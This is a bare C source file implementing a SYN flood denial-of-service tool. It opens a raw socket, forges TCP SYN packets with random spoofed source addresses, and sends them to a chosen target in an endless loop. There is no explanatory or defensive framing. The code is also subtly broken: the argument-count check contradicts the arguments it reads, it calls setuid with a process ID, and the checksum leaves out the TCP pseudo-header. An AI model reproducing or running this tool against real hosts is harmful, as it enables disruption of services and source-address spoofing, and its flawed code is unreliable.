#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
void Access(int sock,struct sockaddr_in *target,unsigned short srcport);
unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char** argv)
{
   int sock;
   struct sockaddr_in target;
   struct hostent *host;
   const int on=1;
   unsigned short srcport;

   if(argc!=2)
   {
           printf("Usage:%s target dstport srcport\n",argv[0]);
           exit(1);
   }

   bzero(&target,sizeof(struct sockaddr_in));
   target.sin_family=AF_INET;
   target.sin_port=htons(atoi(argv[2]));

   if(inet_aton(argv[1],&target.sin_addr)==0)
   {
           host=gethostbyname(argv[1]);
           if(host==NULL)
           {
                   printf("TargetName Error:%s\n",hstrerror(h_errno));
                   exit(1);
           }
           target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
   }


   if(0>(sock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
           perror("Create Error");
           exit(1);
   }


    if(0>setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
           perror("IP_HDRINCL failed");
           exit(1);
   }


   setuid(getpid());
   srcport = atoi(argv[3]);
   Access(sock,&target,srcport);
}

void Access(int sock,struct sockaddr_in *target,unsigned short srcport){
   char buf[128]={0};
   struct ip *ip;
   struct tcphdr *tcp;
   int ip_len;


   ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
   ip=(struct ip*)buf;

   ip->ip_v = IPVERSION;
   ip->ip_hl = sizeof(struct ip)>>2;
   ip->ip_tos = 0;
   ip->ip_len = htons(ip_len);
   ip->ip_id=0;
   ip->ip_off=0;
   ip->ip_ttl=MAXTTL;
   ip->ip_p=IPPROTO_TCP;
   ip->ip_sum=0;
   ip->ip_dst=target->sin_addr;
   tcp = (struct tcphdr*)(buf+sizeof(struct ip));
#ifdef __linux
   tcp->source = htons(srcport);
   tcp->dest = target->sin_port;
   tcp->seq = random();
   tcp->doff = 5;
   tcp->syn = 1;
   tcp->check = 0;
#else
   tcp->th_sport = htons(srcport);
   tcp->th_dport = target->sin_port;
   tcp->th_seq = random();
   tcp->th_off = 5;
   tcp->th_flags =0x02;
   tcp->th_sum = 0;
#endif

   while(1){
           ip->ip_src.s_addr = random();
           tcp->th_sum = check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
           sendto(sock,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
   }
}

unsigned short check_sum(unsigned short *addr,int len)
{
   register int nleft=len;
   register int sum=0;
   register short *w=addr;
   short answer=0;

   while(nleft>1)
   {
           sum+=*w++;
           nleft-=2;
   }
   if(nleft==1)
   {
           *(unsigned char *)(&answer)=*(unsigned char *)w;
           sum+=answer;
   }

   sum=(sum>>16)+(sum&0xffff);
   sum+=(sum>>16);
   answer=~sum;
   return(answer);
}
